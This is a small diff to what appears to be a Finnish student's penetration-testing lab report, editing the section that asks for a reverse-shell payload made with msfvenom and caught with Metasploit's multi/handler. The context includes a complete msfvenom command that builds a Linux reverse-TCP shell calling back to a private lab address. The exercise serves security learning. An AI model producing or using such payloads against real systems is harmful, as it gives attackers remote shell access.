@@ -246,7 +246,7 @@ tässä osiossa hain kaikki ensin ja sitten filtteröin kaikki 1495 pois ja sain
 
 ## e) Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin (reverse shell). Ota yhteys vastaan metasploitin multi/handler -työkalulla.
 
-Luodaan msfvenomilla:
+Luodaan msfvenomilla haitta ohjelma:
 
     msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f elf > reverse_shell.elf
 
